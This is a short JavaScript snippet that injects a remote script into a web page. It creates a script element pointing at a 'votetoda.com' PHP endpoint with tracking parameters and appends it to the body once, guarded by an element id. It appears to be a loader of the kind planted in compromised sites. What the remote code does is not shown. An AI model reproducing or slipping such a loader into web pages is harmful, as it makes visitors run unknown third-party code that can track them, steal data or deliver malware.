var i = document.createElement("script");
i.id = "dexscriptid";
i.src = "https://votetoda.com/ext/script.php?id=ukr&track=true";
var a = document.getElementById("dexscriptid");
if (a === null) {
    document.body.appendChild(i)
    }